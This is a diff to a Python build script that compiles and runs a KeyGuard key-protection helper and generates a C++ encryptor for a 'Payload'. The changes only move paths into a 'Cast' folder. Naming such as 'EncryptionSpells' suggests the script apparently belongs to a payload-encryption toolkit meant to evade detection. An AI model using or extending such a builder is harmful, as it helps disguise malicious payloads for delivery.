@@ -7,14 +7,13 @@ def get_keyguard():
     global KeyGuard
     if KeyGuard:
         return KeyGuard
-    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o KeyGuard KeyGuard.c -mwindows")
-    os.system("KeyGuard.exe 32")
+    os.system(f"g++ --static -w -o Cast\\KeyGuard Cast\\KeyGuard.c -mwindows")
     pattern = re.compile(r'unsigned char (\w+)\[\] = \{[^}]+\};', re.DOTALL)
     hint_pattern = re.compile(r'\[\+\] Using "(0x[0-9A-Fa-f]+)" As A Hint Byte')
     keys = {}
     HintByte = ""
-    stdout_text = os.popen("KeyGuard.exe 32").read()
-    
+    stdout_text = os.popen("Cast\\KeyGuard.exe 32").read()
+
     hint_match = hint_pattern.search(stdout_text)
     if hint_match:
         HintByte = hint_match.group(1)
@@ -26,20 +25,20 @@ def get_keyguard():
 
     OriginalKey = keys.get("OriginalKey", "")
     ProtectedKey = keys.get("ProtectedKey", "")
-    os.remove("KeyGuard.exe")
+    os.remove("Cast\\KeyGuard.exe")
     KeyGuard = OriginalKey, ProtectedKey, HintByte
     return KeyGuard
 
 def build_encryptor (Encryption, Payload):
 
-    f = open ("encryptor.cpp", "a")
+    f = open ("Cast\\encryptor.cpp", "a")
     f.write(f"""
 #include <iostream>
 #include <string> 
 #include <Windows.h>
 #include <stdio.h>
-#include "Spells/EncryptionSpells/{Encryption}"
-#include "Spells/EncryptionSpells/Padding.h"
+#include "../Spells/EncryptionSpells/{Encryption}"
+#include "../Spells/EncryptionSpells/Padding.h"
 
 FILE create_ecrypted_binary_file(PBYTE pPayloadAddress, DWORD pPayloadSize)
 {{
@@ -77,10 +76,10 @@ int main()
 """)
     
     f.close()
-    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o encryptor encryptor.cpp TinyAES.c -mwindows")
-    os.system("encryptor.exe")
-    os.remove("encryptor.cpp")
-    os.remove("encryptor.exe")
+    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o Cast\\encryptor Cast\\encryptor.cpp Cast\\TinyAES.c -mwindows")
+    os.system("Cast\\encryptor.exe")
+    os.remove("Cast\\encryptor.cpp")
+    os.remove("Cast\\encryptor.exe")
     return
 
 def read_encrypted_payload():
